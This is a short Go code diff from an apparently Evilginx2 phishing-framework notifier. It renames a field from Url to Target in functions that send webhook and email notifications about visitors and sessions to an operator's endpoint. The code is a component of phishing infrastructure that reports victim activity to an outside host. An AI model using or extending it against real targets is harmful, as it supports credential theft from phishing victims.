@@ -45,10 +45,10 @@ func NotifierSend(n *Notify, body []byte) error {
 		var req *http.Request
 		var err error
 		if n.Method == "GET" {
-			req, err = http.NewRequest(http.MethodGet, n.Url, bytes.NewBuffer(body))
+			req, err = http.NewRequest(http.MethodGet, n.Target, bytes.NewBuffer(body))
 		}
 		if n.Method == "POST" {
-			req, err = http.NewRequest(http.MethodPost, n.Url, bytes.NewBuffer(body))
+			req, err = http.NewRequest(http.MethodPost, n.Target, bytes.NewBuffer(body))
 
 			req.Header.Add("Content-Type", "application/json")
 		}
@@ -74,7 +74,7 @@ func NotifierSend(n *Notify, body []byte) error {
 	case "E-Mail":
 		m := gomail.NewMessage()
 		m.SetHeader("From", n.FromAddress)
-		m.SetHeader("To", n.Url)
+		m.SetHeader("To", n.Target)
 		m.SetHeader("Subject", "Evilginx2 Notification")
 		m.SetBody("text/plain", string(body))
 
@@ -87,7 +87,7 @@ func NotifierSend(n *Notify, body []byte) error {
 		if n.BasicAuthUser != "" && n.BasicAuthPassword != "" {
 			d = gomail.Dialer{Host: n.SMTPserver, Port: 587, Username: n.BasicAuthUser, Password: n.BasicAuthPassword}
 		}
-		log.Debug("Mail Notification sent to " + n.Url)
+		log.Debug("Mail Notification sent to " + n.Target)
 
 		if err := d.DialAndSend(m); err != nil {
 			log.Fatal("Notifier E-Mail failed. %v", err)
@@ -132,7 +132,7 @@ func NotifyOnVisitor(n *Notify, session database.Session, url *url.URL) error {
 
 	query := url.Query()
 	if n.ForwardParam != "" && query[n.ForwardParam] != nil {
-		n.Url = fmt.Sprintf("%s/?%s=%s", n.Url, n.ForwardParam, query[n.ForwardParam][0])
+		n.Target = fmt.Sprintf("%s/?%s=%s", n.Target, n.ForwardParam, query[n.ForwardParam][0])
 	}
 
 	body, err := NotifyGenerateBody(n, info)
